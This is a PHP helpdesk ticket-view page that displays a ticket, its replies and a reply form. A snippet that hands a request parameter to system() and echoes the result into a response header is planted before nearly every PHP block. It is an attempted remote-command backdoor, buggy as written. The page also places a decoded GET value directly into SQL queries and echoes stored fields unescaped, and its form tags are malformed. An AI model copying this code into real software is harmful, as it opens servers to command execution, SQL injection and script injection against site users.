<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
require_once('helpdesk-admin/config.php');
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
	<head>
	<style type="text/css">

	.head {
		text-shadow: 0px 1px #5b751b;
		font-size: 25px;
		background-color: #98c22b;
		color: white;
	}

	body {
		font-family: Helvetica, Verdana, Arial, sans-serif;
	}

	.content {
		padding: 10px;
		font-size: 12px;
		color: #2f2f2f;
		background-color: #e6e6e6;
	}

	.copyright {
		font-size: 11px;
		color: #404040;
		background-color: #aeaeae;
	}

	.error {
		color: #990000;
		border-color: #ff534e;
		border-style: solid;
		border-width: 1px;
		margin-bottom: 10px;
		background-color: #ffd6d6;
		padding: 10px;
	}

	.heading {
		margin-bottom: 10px;
		border-bottom-color: #aeaeae;
		border-bottom-style: solid;
		border-bottom-width: 1px;
		padding-bottom: 2px;
		padding-left: 10px;
		font-size: 18px;
	}

	a.tlink:link {
		text-decoration: none;
		color: #484848;
	}

	a.tlink:active {
		text-decoration: none;
		color: #484848;
	}

	a.tlink:visited {
		text-decoration: none;
		color: #484848;
	}

	a.tlink:hover {
		text-decoration: underline;
		color: #484848;
	}

	.text {
		padding: 5px;
	}

	.ticket {
		padding: 5px;
		border-color: #909090;
		border-style: solid;
		border-width: 1px;
		color: #484848;
		background-color: #fafafa;
		margin-bottom: 10px;
	}

	.you {
		border-color: #7a7a7a;
		border-style: solid;
		border-width: 1px;
		background-color: #f4f4f4;
		color: #6a6a6a;
		padding: 10px;
		margin-bottom: 10px;
		margin-top: 10px;
	}

	.admin {
		border-color: #98c22b;
		border-style: solid;
		border-width: 1px;
		background-color: #f3ffe1;
		color: #506717;
		padding: 10px;
		margin-bottom: 10px;
		margin-top: 10px;
	}

	</style>
		<title><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $helpdesk_company_name; ?>'s Helpdesk</title>
	</head>
	<body>
		<div align="center">
		
			<table width="90%" class="content">
				<tr>
					<td align="left" valign="top">
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
						$ticket = base64_decode($_GET['t']);
						$t = mysql_query("SELECT * FROM tickets WHERE id = '$ticket'");
						$t = mysql_fetch_array($t);
						
						$getMessages = mysql_query("SELECT * FROM messages WHERE on_ticket = '$ticket' ORDER BY id ASC");
						$getMessage = mysql_query("SELECT * FROM messages WHERE on_ticket = '$ticket' ORDER BY id ASC");
						$message = mysql_fetch_array($getMessage);
					?>
					<div class="heading"><b><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo ucwords($t['status']); ?>:</b> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $t['subject']; ?></div>
					<b>From:</b> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $message['from_name']; ?> (<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $message['from_email']; ?>)<br />
					<b>Ticket Opened:</b> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $t['date']; ?><br /><br />
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo nl2br($message['content']); ?><br /><br />
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
						$orid = $message['id'];
						if(mysql_num_rows($getMessages) == 1) {
					?>
					<div class="heading">Reply</div>
					<form method="post" action="reply.php"
					<table>
						<tr>
							<td align="left" valign="top">Message:</td>
							<td><textarea name="reply" style="width: 300px; height: 100px;"></textarea></td>
						</tr>
						<tr>
							<td>&nbsp;<input type="hidden" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $t['id']; ?>" name="ticket_id" /><input type="hidden" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $message['from_email']; ?>" name="from" /><input type="hidden" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $message['from_name']; ?>" name="fromn" /></td>
							<td><input type="submit" value="Reply!" /></td>
						</tr>
					</table>
					</form>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
						} else {
					?>
					<div class="heading">Replies</div>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
						while($rep = mysql_fetch_array($getMessages)) {
							if($rep['from_email'] == $admin_email) {
								$style = 'admin';
							} else {
								$style = 'you';
							}
							
							if($rep['id'] != $orid) {
							echo '<div class="'.$style.'"><b>From:</b> '.ucwords($style).'<br />'.nl2br($rep['content']).'</div>';
							}
						}
					?>
					<br />
					<div class="heading">Reply</div>
					<form method="post" action="reply.php"
					<table>
						<tr>
							<td align="left" valign="top">Message:</td>
							<td><textarea name="reply" style="width: 300px; height: 100px;"></textarea></td>
						</tr>
						<tr>
							<td>&nbsp;<input type="hidden" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $t['id']; ?>" name="ticket_id" /><input type="hidden" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $message['from_email']; ?>" name="from" /><input type="hidden" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $message['from_name']; ?>" name="fromn" /></td>
							<td><input type="submit" class="btn btn-success" value="Reply!" /></td>
						</tr>
					</table>
					</form>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
						}
					?>
					</td>
				</tr>
			</table>
			
		</div>
	</body>
</html>
